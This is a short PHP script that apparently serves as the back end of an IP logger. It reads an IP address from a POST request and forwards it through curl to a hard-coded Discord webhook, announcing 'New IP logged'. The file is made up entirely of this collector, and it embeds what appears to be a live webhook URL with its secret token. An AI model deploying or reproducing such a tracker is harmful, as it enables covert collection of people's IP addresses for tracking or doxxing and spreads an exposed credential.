<?php
// Replace with your Discord webhook URL
$webhook_url = 'https://discord.com/api/webhooks/1241493208022908958/VNbb4xWXE4ZqjrpPEr-PqkXIxajri8QwT-IJV2zRgSARiVOOgif4ayvsrqBWzq7zkY98';

// Get the IP address from the POST request
$ip = $_POST['ip'];

// Prepare the message to send to Discord
$message = "**New IP logged:**\n`{$ip}`";

// Send the message to the Discord webhook
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array('content' => $message)));
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_exec($ch);
curl_close($ch);
?>
